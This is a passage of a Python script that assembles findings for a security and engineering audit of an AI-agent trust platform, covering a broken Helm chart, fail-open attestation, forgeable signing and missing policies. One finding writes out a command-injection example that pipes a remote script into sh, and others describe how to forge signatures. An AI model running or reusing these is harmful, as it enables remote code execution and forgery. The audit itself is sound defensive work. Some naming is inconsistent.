"""Remaining sections + document assembly for the Warrantor critical analysis."""
from __future__ import annotations

import pathlib

from build_critical_analysis import (AUDIT_DATE, BRANCH, COMMIT, COMPONENTS, CSS, FINDINGS, JS, OUT,
                                     PROTOCOLS, bullets, esc, filter_bar, grade_pill, md, para,
                                     render_finding, sev_pill, tag)
import sections as S

# --- findings discovered by the Python/Go pass, appended to the register -------------------
EXTRA_FINDINGS = [
    dict(
        fid="AX-25", sev="Critical", title="The Helm chart cannot render, and deploy/k8s is empty",
        area="Deployment", blocks="deploy", gate="G6 Functional deployment", effort="M", evidence="EXECUTED",
        where="`deploy/helm/aumos/templates/deployments.yaml:1`, `services.yaml:1`, `hpa.yaml:2`",
        what="All three templates use `{{- range $name, $svc := list \"trust-core\" .Values.trustCore … }}` followed "
             "by `{{- if $svc.enabled }}`. **`range` over a slice with two variables binds (index, element)**, so "
             "`$name` is the integer `0` and `$svc` is the string `\"trust-core\"`.",
        scenario="Reproduced offline with Go `text/template` plus a sprig-equivalent `list`: "
                 "`TEMPLATE ERROR: can't evaluate field enabled in type interface {}`. **`helm install` fails before a "
                 "single object is created.** Nobody — no CI job, no test, no human — has ever run `helm template` on "
                 "this repository.",
        blast="Even once fixed, the chart is 129 lines total and contains **no ServiceAccount, no Role/RoleBinding, no "
              "NetworkPolicy, no securityContext, no Secret or certificate management, no PodDisruptionBudget, no "
              "ConfigMap, no Ingress, no NOTES.txt and no `crds/` directory**. `deploy/k8s/`, `deploy/airgap/`, "
              "`deploy/docker/` and `deploy/systemd/` are all **empty**. The admission controller's "
              "`ValidatingWebhookConfiguration` exists only inside a Python docstring. No CRD YAML exists anywhere, "
              "for either claimed operator. `global.imageRegistry: \"\"` renders every image as "
              "`/aumos-trust-core:1.0.0`, an invalid reference, and no images are published.",
        fix="Fix the range idiom (`range $name, $svc := dict …`). Then build the chart properly: RBAC, "
            "ServiceAccounts, NetworkPolicies, pod security contexts, CRDs, webhook configuration with a real "
            "caBundle, and pinned image digests. Add `helm template` and `helm lint` to CI as blocking jobs — this "
            "defect exists only because neither has ever run.",
        accept="`helm lint` and `helm template` pass in CI; a kind-cluster smoke test installs the chart and reaches "
               "readiness.",
    ),
    dict(
        fid="AX-26", sev="Critical", title="Go has no protocol validator at all",
        area="Normative layer", blocks="integrate", gate="G4 Protocol conformance", effort="L", evidence="EXECUTED",
        where="`go/protocol-contracts/generated.go`",
        what="248 lines of struct definitions and nothing else. A grep for `canonical|Marshal|sort|Sign|Verify|"
             "ed25519|jcs` returns two hits, both the word `Signature` as a struct field name. **The package has no "
             "`go.mod`**, so `go build ./...` fails with `directory prefix . does not contain main module`, and "
             "`run_go_checks.py` — which discovers modules via `glob(\"*/go.mod\")` — never sees it.",
        scenario="Every normative rule is unenforced in Go: all 11 required envelope fields, the `message_id`, "
                 "`nonce`, `issuer` and `signature.value` patterns, the `version` const, all 12 payload schemas, every "
                 "enum and bound, temporal validity, signature verification — and **the `critical_extensions` "
                 "must-understand rule**, which is the single most security-critical rule in the registry because "
                 "silently ignoring an unknown critical extension *is* the downgrade attack.",
        blast="Exactly the same orphan pattern as TypeScript's `protocol-contracts` (no `package.json`, absent from "
              "workspaces, imported by nothing, sole source of the 37 lint errors). **The generated protocol bindings "
              "for two of the four languages are dead code that never compiles.** That is the mechanical reason "
              "cross-language conformance cannot exist. `generated.go` also types `IssuedAt`/`ExpiresAt` as `uint64` "
              "where the schema says signed integer, so a negative value yields a JSON type error instead of the "
              "specified `COMMON_SCHEMA` code.",
        fix="Add `go.mod`, write a real validator mirroring the Rust registry interpreter, and wire both Go and "
            "TypeScript into the vector suite. Make module discovery fail loudly on a directory containing `.go` files "
            "but no `go.mod` rather than skipping it silently.",
        accept="Go executes all 40 protocol vectors with error-code agreement against Rust and Python.",
    ),
    dict(
        fid="AX-27", sev="Critical", title="Attestation fails open on real hardware while the mock path is stricter",
        area="Confidential compute", blocks="trust", gate="G10 Security assurance", effort="L", evidence="READ",
        where="`python/warrantor_vllm/src/aumos_vllm/__init__.py:97-108`",
        what="The verification function checks a digest equality for `backend == \"mock\"`, then for every real "
             "backend returns `bool(envelope.measurement) and bool(envelope.quote)` — with a comment saying callers "
             "*should* override it.",
        scenario="**On real SEV-SNP or NVIDIA confidential-compute hardware, any two non-empty strings constitute a "
                 "verified attestation.** The mock path is strictly more rigorous than the production path. This is "
                 "the inverse of every safe default.",
        blast="Compounded across the layer: `go/tee-serve` sources TEE kind, measurement and GPU attestation from "
              "`os.Getenv` with `\"unknown\"` defaults, so anyone with pod-spec control forges any attestation; "
              "`attesta_flow`'s `VERIFY_WEIGHTS` stage is literally `stages.append(Stage.VERIFY_WEIGHTS)` and its "
              "`PipelineAttestation` — documented as *“the signed attestation emitted per batch”* — has **no signature "
              "field**; `edge-sentinel` treats empty baseline fields as *do not check*; and `nooa_ext`'s "
              "`AttestationReport.passed` is a plain bool the caller sets.",
        fix="Delete the permissive branch. An unverifiable attestation must raise, not return true. Bind real NRAS / "
            "SEV-SNP / TDX verification or remove the claim from the product entirely.",
        accept="A negative test where a well-formed but unsigned envelope from an untrusted platform is rejected on "
               "every backend.",
    ),
    dict(
        fid="AX-28", sev="High", title="Signing silently degrades to a forgeable HMAC with a public key",
        area="Trust core", blocks="trust", gate="G10", effort="S", evidence="READ",
        where="`python/warrantor_agent/src/aumos_agent/__init__.py:417-480`",
        what="`except (OSError, subprocess.SubprocessError): pass  # fall through to mock`, then `_mock_sign` derives "
             "`secret = sha256(f\"aumos-mock-key:{key_id}\")` — **a public constant concatenated with a public "
             "key_id** — and HMACs the payload. `verify()` recomputes it and returns `True`.",
        scenario="A missing binary, a wrong path or a transient exec failure converts every signature the agent "
                 "produces into something anyone can forge — with no exception, no log and no marker on the returned "
                 "signature distinguishing it from a real one.",
        blast="Same class elsewhere: `aumos_hf_plugin` verifies model provenance as "
              "`sha256(data_digest + signer + verifying_key)` — every input lives inside the file being verified, so "
              "an attacker swaps the weights, recomputes both values and gets `verified=True`. And its only real "
              "signing branch calls `hashlib.ed25519_sign`, **which does not exist** (`hasattr` returns `False`); no "
              "test covers that branch. `fed_core` verifies attestation freshness with `signature_hex.endswith(...)` "
              "against a publicly computable SHA-256 prefix, with no key at all.",
        fix="Never fall back. A signing failure is an error. Delete `_mock_sign`, the unkeyed provenance check and the "
            "suffix check; if a mock is needed for tests, inject it explicitly and mark its output non-production.",
        accept="Signing raises on trust-core unavailability; a tampered model with recomputed digests is rejected.",
    ),
    dict(
        fid="AX-29", sev="High", title="The real SPIFFE module is orphaned; the string-formatting one ships",
        area="Identity", blocks="trust", gate="G10", effort="M", evidence="EXECUTED",
        where="`go/identity-bindings` vs `go/agent-identity`",
        what="`go/identity-bindings` does **genuine** SPIFFE: real `go-spiffe/v2` imports, `workloadapi.NewX509Source`, "
             "validity-window checks, `x509svid.IDFromCert` cross-validated against the certificate URI SAN, "
             "trust-domain handling, and selector-injection defense. **`grep -rn \"identity-bindings\" go/` outside "
             "its own directory returns empty — nothing imports it.**",
        scenario="What is wired into `cmd/`, the Dockerfile and the Helm chart is `go/agent-identity`, whose entire "
                 "SPIFFE integration is `fmt.Sprintf(\"spiffe://%s/agent-identity\", s.trustDomain)`, whose `go.mod` "
                 "has **zero dependencies**, and whose own header states *“no external SPIRE dependency … Real SPIRE "
                 "integration is task 03.”* Its “SVID” is `hex(json)+\".\"+hex(sig)` — not an X509-SVID, not a "
                 "JWT-SVID, not RFC 7515.",
        blast="`deploy/spire/*.yaml` are well-written manifests with correct `k8s_psat` node attestation and RBAC — and "
              "**no code in the repository consumes them**. Revocation in `agent-identity` writes to an in-process map "
              "and then times its own map write against the `<5s` propagation budget. There is no fan-out.",
        fix="Make `identity-bindings` the shipped path and delete or demote `agent-identity`. Wire the SPIRE manifests "
            "to code that actually speaks the Workload API. Implement real revocation fan-out and measure it "
            "end-to-end.",
        accept="The deployed binary obtains an SVID from a real SPIRE agent; revocation propagates to a second node "
               "within the stated budget.",
    ),
    dict(
        fid="AX-30", sev="High", title="The agent harness runs shell=True behind a one-token allowlist",
        area="Runtime", blocks="trust", gate="G9 Containment", effort="S", evidence="READ",
        where="`python/warrantor_harness/src/aumos_harness/__init__.py:162-167,227`",
        what="The allowlist takes `command.split()[0]`, basenames it, and matches with **`endswith`**. The full "
             "command string is then executed with `shell=True`.",
        scenario="`git status; curl attacker.sh | sh` passes the check, because only the first token is inspected and "
                 "the shell then interprets the rest. Separately, an allowlist entry of `\"git\"` matches `\"evilgit\"` "
                 "because the comparison is a suffix test.",
        blast="This is the component that exists to sandbox a coding agent. The one failing test in the package "
              "asserts the correct exit code via the *deny* branch, so the timeout path it claims to cover has never "
              "executed.",
        fix="Never `shell=True`. Pass an argv vector. Match the resolved executable path exactly, not by suffix. "
            "Validate the whole command, not its first token.",
        accept="A test proving command chaining, substitution and suffix-collision names are all rejected.",
    ),
    dict(
        fid="AX-31", sev="Medium", title="Repo-wide pytest cannot collect, and lint fails on 21 of 35 packages",
        area="CI / assurance", blocks="scale", gate="G3 Correctness", effort="S", evidence="EXECUTED",
        where="`python/`, `.github/workflows/ci.yml:68`",
        what="`pytest python -q` aborts collection entirely — duplicate `test_pipeline.py` basenames with no "
             "`conftest.py` and no `tests/__init__.py` anywhere in the tree. With `--import-mode=importlib` it runs: "
             "**585 passed, 5 failed** of 590. `run_python_checks.py lint` reports **FAIL — 14/35 passed**.",
        scenario="The per-project CI runner masks the collection failure, so nobody sees it. Separately, CI installs "
                 "only `pytest ruff cryptography` while `protocol_contracts/validation.py` imports `jsonschema` — so "
                 "**the single test that exercises all 40 protocol vectors cannot import in CI at all.** The workflow "
                 "also labels its jobs \"Python (34 projects)\" against 35 discovered and \"Go (10 modules)\" against 11.",
        blast="The protocol conformance story is weaker than AX-03 alone suggests: not only does the conformance "
              "runner skip the vectors, the one test that does run them is uninstallable in CI.",
        fix="Add `conftest.py`, install real dependencies in CI, gate on `pytest` across the whole tree, and fix the 21 "
            "lint failures. Correct the job labels — a miscount is a signal that discovery and reporting disagree.",
        accept="Repo-wide `pytest` and `ruff` pass in CI with all dependencies installed.",
    ),
]

EXTRA_FINDINGS += [
    dict(
        fid="AX-32", sev="High", title="The policy plane is an empty directory",
        area="Runtime", blocks="deploy", gate="G5 Fail-closed controls", effort="M", evidence="EXECUTED",
        where="`policies/`",
        what="**`policies/` contains zero files.** The README's repository-layout diagram states "
             "`policies/  # Rego + Cedar + OpenShell profiles`, and `registry.json` defines "
             "`PolicyDecision.engine` as `enum: [\"opa\", \"cedar\", \"openshell\"]` with `policy_digest` a "
             "**required** field of every P2 Agent Action Receipt.",
        scenario="Every receipt must carry the digest of the policy that authorised the action. There are no policies "
                 "to digest. `policy-bridge` has zero `EngineClient` implementations, `flight-recorder` hardcodes "
                 "`engine: \"opa\", decision: \"allow\"` into the field, and `policy-compiler` emits Rego and Cedar "
                 "text that nothing consumes and nothing stores. The entire policy plane referenced by the evidence "
                 "protocol does not exist as artifacts.",
        blast="This closes the loop on AX-11: the fabricated policy decision in `flight-recorder` is not an oversight "
              "but the only thing it *could* emit, because there is no policy corpus and no engine to evaluate one. "
              "Three components (R5, R6, E1) and one protocol (P2) all depend on a directory that is empty.",
        fix="Ship a real starter policy corpus — Rego and Cedar equivalents of the invariants the specs already name "
            "(I-02 attenuation, I-07 receipt-before-commit, I-08 approval for consequential actions) — with digests, "
            "versioning and tests. Wire `policy-bridge` to real OPA and Cedar. Until a policy exists, `policy_digest` "
            "cannot be populated honestly and P2 cannot be emitted.",
        accept="A receipt whose `policy_digest` resolves to a real policy file, evaluated by a real engine, with the "
               "matched rules recorded.",
    ),
    dict(
        fid="AX-33", sev="High", title="The breaking-change gate protects 4 files and misses the normative artifact",
        area="Governance", blocks="integrate", gate="G4 Protocol conformance", effort="S", evidence="EXECUTED",
        where="`buf.yaml`, `.github/workflows/ci.yml:29`",
        what="`buf lint` and `buf breaking --against '.git#branch=main'` both **pass (exit 0)**, and buf genuinely runs "
             "in CI — credit where due, this is a real, working gate. But `buf ls-files` returns exactly four files: "
             "`attestation/v1/report.proto`, `identity/v1/agent.proto`, `protocols/v1/aar.proto`, "
             "`trust/v1/signing.proto`.",
        scenario="**Ten of twelve protocols have no `.proto` at all**, so the contract plane's breaking-change "
                 "protection covers at most P2. More seriously, **`specs/protocols/registry.json` — the actual "
                 "normative artifact that every validator reads — has no breaking-change gate whatsoever.** Neither "
                 "do the twelve JSON Schemas, the twelve CDDL grammars, or the 40 test vectors. Anyone can silently "
                 "change a required field, a regex or an enum.",
        blast="The README's architecture diagram presents `specs/ proto/ testvectors/ policies/` as a single block "
              "labelled *(Buf breaking-change gate)*. Buf only ever sees `proto/`. The gate exists and works; it is "
              "pointed at the least important quarter of the normative layer.",
        fix="Add a schema-diff gate over `registry.json`, the JSON Schemas and the CDDL — fail CI on any change to a "
            "`required` list, `pattern`, `enum`, `const` or numeric bound without a wire-version bump. Either generate "
            "the remaining ten `.proto` files from the registry or remove protobuf from the architecture claim.",
        accept="CI fails when a required field is removed from `registry.json` without a version change.",
    ),
    dict(
        fid="AX-34", sev="Medium", title="A retraction notice sits on top of unretracted claims",
        area="Governance", blocks="claim", gate="G12", effort="S", evidence="EXECUTED",
        where="`docs/final-verification-report.md:5,9,16,17,62`",
        what="Lines 5 and 9&ndash;10 retract: *“691-test claims were not generated from reproducible gate "
             "artifacts”* and *“This claim is not currently substantiated.”* Lines 16&ndash;17 and 62 then still "
             "assert, unmodified: `| **Components at v1.0.0** | 49 |`, `| **Total tests passing** | 691 |`, and "
             "`✅ **691 tests passing** across 4 languages`.",
        scenario="A reader who skims the summary table or the green-tick checklist &mdash; which is what most readers "
                 "do &mdash; sees the unretracted claim. The retraction is a header above a body that still says the "
                 "opposite.",
        blast="Worth noting the count itself is **understated, not inflated**: measured totals are 242 Rust + 590 "
              "Python collected + 159 TypeScript + Go, comfortably above 691. The problem is not the number; it is "
              "that it is paired with *“feature-complete at v1.0.0”* while 371 of 371 task checkboxes are open and one "
              "of fourteen release gates passes.",
        fix="Delete the retracted claims from the table and the checklist rather than annotating around them. If a "
            "document is superseded, mark it superseded and stop maintaining two truths inside it.",
        accept="No document asserts a metric its own header retracts.",
    ),
]

EXTRA_FINDINGS += [
    dict(
        fid="AX-35", sev="High", title="38 publications cite reference platforms that do not implement the mechanism",
        area="Governance", blocks="claim", gate="G12", effort="M", evidence="EXECUTED",
        where="`docs/html/papers/` (24), `docs/html/whitepapers/` (6), `docs/html/blog-series/` (8)",
        what="**To be fair first: these are paper *proposals*, not published results.** Each carries a "
             "*“Target venue”* line &mdash; NDSS 2027, USENIX Security 2027, ACM CCS 2027 &mdash; so this is a "
             "research agenda, which is a legitimate and even admirable thing to publish. The exposure is narrower and "
             "specific: **every one names a “Reference platform”, and in several cases that platform does not "
             "implement the mechanism the paper is about.**",
        scenario="`paper-15-ebpf-exfiltration-prevention` cites *“Reference platform: Warrantor R-pillar (eBPF "
                 "enforcement), R2”* &mdash; a repo-wide grep for `aya|libbpf|redbpf|bcc|ebpf` across "
                 "`egress-filter` and `exfil-guard` returns **0**. `paper-14-ai-kill-switch` and "
                 "`wp4-ai-kill-switch-act` cite R3, which is a `Vec<String>` of action names. "
                 "`paper-02-cross-language-canonical-signing` cites *“conformance vectors (V2/V3)”* &mdash; "
                 "`testvectors/` contains only `T1`, `S3` and `protocols`; **the V2/V3 lanes do not exist** &mdash; and "
                 "its subject, canonical signing, is the site of AX-01 and has no cross-language conformance at all. "
                 "`paper-18-conformance-as-a-service` describes a suite that executes 5 of 45 available vectors. "
                 "`paper-05` and `paper-07` on attested inference cite a 100%-mock attestation layer. "
                 "`wp6-post-quantum-ai-security` is a FIPS 203/204/205 migration whitepaper naming T1/T2/I1/C1-4 &mdash; "
                 "a grep for `ml-kem|ml-dsa|dilithium|kyber|sphincs|slh-dsa|pqcrypto` returns **0**; the stack is "
                 "Ed25519-only with no PQ migration path in code.",
        blast="**NDSS, CCS and USENIX Security all now run artifact evaluation.** A submission whose artifact does not "
              "contain the mechanism in its title does not merely get rejected &mdash; it gets remembered. This is the "
              "highest-visibility credibility surface the project has, and it is the one least connected to the code. "
              "Separately, `wp2-eu-ai-act-article-55` leads with the EU AI Act, which inverts the stated "
              "US / GCC / India market doctrine.",
        fix="Add a **status line to every publication** distinguishing *mechanism implemented and measured* from "
            "*mechanism proposed*. Do not submit a paper whose reference platform lacks the mechanism &mdash; either "
            "build it first (eBPF for paper 15, real containment for paper 14, cross-language conformance for paper 2) "
            "or reframe the paper as a design proposal with an explicit no-artifact statement. Fix the dangling V2/V3 "
            "vector-lane citation. Reprioritise `wp2` behind US/GCC/India instruments.",
        accept="Every publication's reference-platform claim resolves to code that implements the named mechanism, or "
               "is explicitly labelled as unimplemented.",
    ),
    dict(
        fid="AX-36", sev="Low", title="Compiled Python bytecode is tracked in git",
        area="Supply chain", blocks="claim", gate="G11 Supply-chain verification", effort="S", evidence="EXECUTED",
        where="`deploy/modal/__pycache__/`, `deploy/modal/tests/__pycache__/`",
        what="`git ls-files` returns **4 tracked `.pyc` files**. Total tracked files in the repository: 565.",
        scenario="`.pyc` files can contain bytecode that diverges from the `.py` beside them &mdash; a well-known "
                 "supply-chain trojan vector, since most reviewers read source and not bytecode.",
        blast="Rhetorically the worst small finding in the audit: this is a project whose thesis is AI supply-chain "
              "integrity, which ships `tamper-scan` and `provena-chain` specifically to detect artifact/source "
              "divergence, and which commits exactly the artifact class those components exist to catch. Also note "
              "`deploy/modal/` is not in the README's repository-layout diagram at all.",
        fix="`git rm --cached` the bytecode, extend `.gitignore`, and add a CI check rejecting any tracked "
            "`__pycache__`, `*.pyc` or build-output path. Add `deploy/modal/` to the README layout or remove it.",
        accept="CI fails on any tracked build artifact.",
    ),
]

EXTRA_FINDINGS += [
    dict(
        fid="AX-37", sev="Critical", title="18 source directories have no catalog identity — and the worst defects live there",
        area="Governance", blocks="claim", gate="G1 Catalogue integrity", effort="M", evidence="EXECUTED",
        where="`docs/implementation/catalog.json` vs the filesystem",
        what="I diffed every source directory on disk against every path claimed by the catalog. **23 directories are "
             "unclaimed.** Five of those hold a catalog ID with empty `source_paths` (that is AX-12). The remaining "
             "**18 have no catalog identity of any kind — approximately 11,100 LOC** that the canonical catalogue of "
             "“54 implementable components” does not know exists.",
        scenario="**Three of the four Critical defects found in the Python and Go layers live in this untracked code.** "
                 "`python/warrantor_vllm` (559 LOC) fails attestation *open* on real hardware. `python/warrantor_agent` "
                 "(1,734 LOC — the largest Python package in the repository) silently degrades signing to a forgeable "
                 "HMAC keyed on a public constant. `python/warrantor_harness` (693 LOC) runs `shell=True` behind a "
                 "one-token `endswith` allowlist. None appears in any catalog entry, any RFC, any release gate or any "
                 "status report.",
        blast="The inverse is equally damaging: **`rust/protocol-contracts` (1,173 LOC) — the P1&ndash;P12 registry "
              "interpreter, the single most correct piece of code in the repository, enforcing 591 of 602 normative "
              "constraints — also has no catalog entry.** So the governance artifact that defines what Warrantor *is* "
              "simultaneously hides its worst liabilities and its best asset. Also untracked: `python/warrantor_rbac` (a "
              "second authorization engine that gates `TRIGGER_KILL_SWITCH`), `python/warrantor_admission` (the Kubernetes "
              "admission controller), `python/protocol_contracts` (the Python validator), and all four "
              "`protocol-contracts` packages.",
        fix="Make catalog integrity **bidirectional and blocking**: fail CI if any directory containing source files "
            "is not claimed by exactly one catalog entry, and if any claimed path does not exist. Then triage the 18 "
            "&mdash; promote `protocol-contracts` and `aumos_rbac` to first-class components, and either bring "
            "`aumos_vllm`, `aumos_agent` and `aumos_harness` under the same review bar as the catalogued 54 or delete "
            "them. Untracked code in a security substrate is worse than absent code, because nothing reviews it.",
        accept="A bidirectional integrity check in CI; every source directory maps to exactly one catalog entry; the "
               "three Critical defects above are either fixed or their code removed.",
    ),
]

EXTRA_FINDINGS += [
    dict(
        fid="AX-38", sev="Critical", title="CI has never run and cannot run as written",
        area="CI / assurance", blocks="claim", gate="G2 · G3 · G11 · G12 — all of them", effort="S",
        evidence="EXECUTED",
        where="`.github/workflows/*` — 34 path entries",
        what="Every workflow prefixes its paths with `aumos/` — `working-directory: aumos`, "
             "`working-directory: aumos/rust`, `buf breaking --against '…#branch=main,subdir=aumos'`. But "
             "`git rev-parse --show-toplevel` returns the **`aumos` directory itself**. There is no parent repository. "
             "So every job resolves to `aumos/aumos`, which does not exist, and fails before running a single step.",
        scenario="Measured: **0 remotes configured, 0 tags, 0 of 27 commits signed-off** (DCO is mandated by "
                 "`CONTRIBUTING.md:44`), **0 GPG-signed**. The repository has never been pushed. The workflows were "
                 "written for a parent-repo layout this repository does not have.",
        blast="**This supersedes and worsens AX-16.** I previously characterised the gates as non-blocking because of "
              "`|| true`. They are not merely non-blocking — they are **inert**. Buf breaking, SBOM generation, SLSA "
              "provenance, coverage, fuzzing and Dependabot are all gated on jobs that cannot start. Every "
              "CI-dependent claim in the README is therefore unverified by CI, and the eslint and Python-lint failures "
              "I reported are ones nobody has ever been shown. It also means the `|| true` escapes were never load-"
              "bearing: nothing downstream of them ever executed either.",
        fix="Drop the `aumos/` prefix from all 34 entries, or restructure the GitHub repository so it contains `aumos/` "
            "as a subdirectory — then push, and fix what goes red. Add a DCO check and a signed-tag release step. "
            "Until a workflow has actually completed once, treat every gate status in the tracker as unknown rather "
            "than open.",
        accept="A green CI run visible on a real remote, with the lint and coverage failures either fixed or "
               "explicitly waived.",
    ),
    dict(
        fid="AX-39", sev="Critical", title="The substrate does not model its own compromise",
        area="Threat model", blocks="trust", gate="G10 Security assurance", effort="XL", evidence="READ",
        where="`docs/rfcs/`, `docs/02-architecture.md`",
        what="Of eight ways the substrate itself can be turned against its users, **seven are entirely unanalysed**: "
             "root-key compromise, key rotation and recovery after compromise, a malicious or misconfigured policy, a "
             "hostile skill package, an insider or rogue credential issuer, a compromised receipt log or split-view "
             "attack, and control-plane denial of service. Only confused-deputy is handled — and handled well, with "
             "`AUDIENCE_MISMATCH` enforced and tested.",
        scenario="**Invariant I-11 — *“an agent cannot modify its own enforcement boundary, policy, or identity”* — has "
                 "zero implementing code.** A grep for `self_change|self-change|self_modify|modify its own` across all "
                 "four languages returns nothing. So do I-01 (no identity, no action), I-03, I-10 (replay detectable) "
                 "and I-12 (physical safe state): **5 of 12 invariants have no code at all.** "
                 "`docs/02-architecture.md:55` states *“A component that breaks an invariant fails CI”* — no CI job "
                 "checks any invariant, and per AX-38 no CI job runs.",
        blast="For a project whose thesis is *“the security substrate that agents cannot bypass,”* the unmodelled "
              "scenarios are precisely the ones that matter. The README's claimed *“STRIDE threat models for pillars "
              "1/4/7”* resolves to **3 real threat tables across 54 RFCs**; pillar 4 has none. The other 46 defer to "
              "*“the `docs/cross-cutting/` threat-model standard”* — **a dangling reference with no filename, "
              "replicated 46 times**. Of the three real tables, `T1-trust-core`'s cites three mitigations that do not "
              "exist (batch verify, KMS/HSM, I1-gated key access); `X8-mcp-gateway`'s is genuinely excellent.",
        fix="Write one adversary model and one trust-boundary diagram before any further component work. Analyse the "
            "seven missing scenarios, starting with root-key compromise and log split-view, since both invalidate "
            "every downstream guarantee. Implement I-11 or withdraw it. Publish an explicit residual-risk statement — "
            "what Warrantor does **not** defend against — which currently exists nowhere.",
        accept="An adversary model, a trust-boundary diagram, a residual-risk statement, and at least one adversarial "
               "test per invariant that currently has zero code.",
    ),
    dict(
        fid="AX-40", sev="Critical", title="There is no persistence anywhere, so revocation and evidence are amnesiac",
        area="Evidence", blocks="deploy", gate="G8 Durable evidence", effort="XL", evidence="EXECUTED",
        where="every `Cargo.toml`, `go.mod`, `pyproject.toml`, `package.json`",
        what="**Zero occurrences of any database driver, cache client or object-store SDK** — no `sled`, `rocksdb`, "
             "`sqlx`, `diesel`, `rusqlite`, `postgres`, `redis`, `sqlalchemy`, `psycopg`, `boto3` or `minio` in any "
             "manifest in the repository.",
        scenario="`credential-vault` holds revocation state in a process-global `Mutex<HashSet>`, so **a restart "
                 "un-revokes every revoked credential** — which breaks I-05 outright. `flight-recorder` computes "
                 "canonical evidence bytes and has **no write path to durable storage at all**, which makes I-07 "
                 "(*“the action only commits once evidence is durable”*) unimplementable as specified rather than "
                 "merely unimplemented.",
        blast="`docs/cross-cutting/16-disaster-recovery.md` publishes an RPO/RTO table claiming *“KillSwitchKit | 30 "
              "seconds | RPO 0 (sync replication)”* and *“Audit logs | Continuous | 7 years | S3 + Glacier”* — "
              "describing infrastructure that does not exist, for a component whose execution layer is a list of "
              "strings. The same document asserts *“Every component has runbooks”*; a search for `*runbook*` returns "
              "**zero files**. It also contains a business-continuity section about runway and bridge rounds, which is "
              "a fundraising deck pasted into an engineering DR plan.",
        fix="Choose one durable store and put the evidence plane on it before any further protocol work — P2 is "
            "meaningless without it. Make revocation survive restart. Then rewrite the DR document to describe what "
            "exists, or delete it; an aspirational RPO of 0 is worse than an honest 'none'.",
        accept="Evidence survives a process restart; a revoked credential stays revoked; the DR document's RPO/RTO "
               "table is backed by a tested restore.",
    ),
    dict(
        fid="AX-41", sev="High", title="Governance is the product, and none of it is implemented",
        area="Governance", blocks="claim", gate="G12", effort="M", evidence="EXECUTED",
        where="`LICENSE`, `CONTRIBUTING.md`, `docs/cross-cutting/15-open-source-governance.md`",
        what="**`LICENSE` is verbatim Apache-2.0 and nothing else.** The four-way split the README announces — "
             "Apache-2.0 core, **BSL 1.1** enterprise with a 4-year change date, CC-BY-4.0 docs, CDLA-Permissive-2.0 "
             "datasets — exists only as prose. **0 of 160 tracked source files carry an SPDX identifier**; there are no "
             "per-directory LICENSE files and no `NOTICE`. The components the governance document names as BSL "
             "(`typescript/console`, `go/tenant-guard`, `go/defstack-cloud`, `go/sovereign-stack`) ship Apache-2.0 or "
             "unmarked. The README says docs are CC-BY-4.0; the governance document says CC-BY-**SA**-4.0.",
        scenario="**DCO is mandated and 0 of 27 commits comply.** `CONTRIBUTING.md:60` even documents the wrong trailer "
                 "(`DCO:` rather than `Signed-off-by:`), contradicting the `git commit -s` instruction on the line "
                 "above. No DCO bot, no CLA document despite the CLA-bot claim, no `CODEOWNERS`, no PR or issue "
                 "templates, no `MAINTAINERS`, no `GOVERNANCE.md`. `git shortlog -sn` returns a single synthetic "
                 "author, *Warrantor Wave-1 &lt;aumos@local&gt;*, for all 27 commits. The governance document names zero "
                 "humans and is branded for a different project — it governs and trademarks *“Warrantor”*.",
        blast="The BSL risk is **latent rather than realised**, and that is worse for credibility, not better: nothing "
              "is encumbered today, so whoever ships first must either retro-apply BSL to code already released under "
              "Apache-2.0 — **irrevocable for released versions** — or drop the BSL story. Decide before the first "
              "tag. And a body calling itself an *Alliance* with one machine identity, no remote, no PR and no "
              "external contributor has no alliance.",
        fix="Pick the licence model and apply it in files, not prose: SPDX headers everywhere, per-directory LICENSE "
            "for anything non-Apache, a `NOTICE`. Reconcile the CC-BY conflict. Add `CODEOWNERS`, PR/issue templates, "
            "a real CLA or drop the claim, and a DCO check that actually runs. Rebrand the governance document from "
            "Warrantor to Warrantor and name people.",
        accept="Every file's licence is machine-determinable; DCO enforced in CI; the governance document names "
               "accountable humans.",
    ),
    dict(
        fid="AX-42", sev="High", title="Eleven published latency budgets, zero benchmarks",
        area="Performance", blocks="scale", gate="G12 Reliability", effort="L", evidence="EXECUTED",
        where="`docs/02-architecture.md:170-177`, `docs/rfcs/I1-agent-identity.md:104-106`",
        what="Eleven numeric budgets are published — identity revocation &lt;5s fleet-wide, credential revocation "
             "&lt;1s, kill switch &lt;5s end-to-end, token validation &lt;1ms p99, policy eval &lt;2ms p99, 32-deep "
             "delegation &lt;10ms p99, sandbox attestation &lt;100ms cold, egress overhead &lt;2%, GPU attestation "
             "&lt;500ms, proxy overhead &lt;2ms/req, tee-serve &lt;2ms. **There is no benchmark harness in any of the "
             "four languages** — no criterion, no `[[bench]]`, no Go `Benchmark*`, no k6, locust, JMH or "
             "pytest-benchmark, and no bench job in any workflow. **No p99 is computed anywhere.**",
        scenario="The three budgets that *are* 'tested' are tautological, and two say so in their own comments. "
                 "Identity revocation times an **in-memory map delete**. Credential revocation times a "
                 "`HashSet::remove`, with a code comment conceding it is *“vanishingly unlikely for an in-process "
                 "HashSet”*. The kill-switch budget test is a `thread::sleep(5ms)` against a zero-nanosecond budget, "
                 "measuring a function whose body is a list of strings.",
        blast="For a substrate that sits on **every agent action**, latency is a correctness property, not a "
              "nice-to-have. And the hot path is pathological: `canonical_cbor` performs **three full serde passes** "
              "per signature — serialize, deserialize into a fully boxed tree, re-serialize — of which two are pure "
              "overhead, and `sort_value` walks the entire tree to do nothing, as its own comment admits the "
              "`BTreeMap` already guarantees order. Ed25519 itself is 20&ndash;50&micro;s and is not the bottleneck. "
              "There is no batching, no caching and no connection pooling, and two process-global mutexes "
              "(the rate limiter and the vault) serialise every request.",
        fix="Benchmark the hot path before optimising anything else, and delete the two redundant serde passes — that "
            "is likely a multiple-x win for one small change. Publish measured p99s beside every budget, or delete "
            "the budgets. A number nobody measures is a liability in a regulated conversation.",
        accept="A criterion suite covering canonicalize/sign/verify plus a load test producing real p99s for each of "
               "the eleven budgets.",
    ),
    dict(
        fid="AX-43", sev="High", title="Five of the seven cross-cutting standards have no implementation at all",
        area="Interop", blocks="integrate", gate="G12", effort="L", evidence="EXECUTED",
        where="`README.md:141-144`",
        what="The README asserts *“19 cross-cutting standards apply to every component.”* **Eight exist**, numbered "
             "13&ndash;20; standards 01&ndash;12 do not exist — and two of the missing ones are cited by live "
             "configuration (`.github/dependabot.yml` and `sbom.yml` both cite `cross-cutting 08-sbom-strategy`; a "
             "wave guide cites `11-nvidia-compatibility-matrix.md`).",
        scenario="Taking the seven named standards in turn: **OTel mandatory** — one file emits an OTel-shaped JSON "
                 "blob; there is **no `opentelemetry` dependency anywhere**, no tracer, no exporter, no collector. "
